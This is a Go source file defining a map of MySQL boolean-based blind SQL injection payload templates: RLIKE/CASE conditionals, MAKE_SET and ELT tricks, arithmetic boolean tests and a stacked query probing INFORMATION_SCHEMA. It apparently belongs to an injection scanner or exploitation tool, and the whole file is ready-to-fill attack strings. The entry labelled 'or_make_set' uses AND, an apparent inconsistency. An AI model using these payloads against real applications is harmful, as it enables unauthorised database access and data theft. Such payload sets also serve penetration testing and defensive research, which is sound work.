package mysql

var B_Vectors = map[string]string {
	"rlike": "%s RLIKE (SELECT (CASE WHEN (%s) THEN 1 ELSE 0x20 END))%s",
	"and_make_set": "%s AND MAKE_SET(1111=8104,%s)%s",
	"or_make_set": "%s AND MAKE_SET(1111=8104,%s)%s",
	"and_elt": "%s AND ELT(1111=8104,%s)%s",
	"or_elt": "%s OR ELT(1111=8104,%s)%s",
	"and_bool_int": "%s AND (%s)*1%s",
	"or_bool_int": "%s OR (%s)*1%s",
	"make_set_rep": "%sMAKE_SET(1111=8104,%s)%s",
	"elt_rep": "%sELT(7944=2817,%s)%s",
	"bool_int_rep": "%s(%s)*1%s",
	"stacked": "%s;SELECT (CASE WHEN (%s) THEN 1 ELSE 1*(SELECT 1 FROM INFORMATION_SCHEMA.PLUGINS) END)#",
}
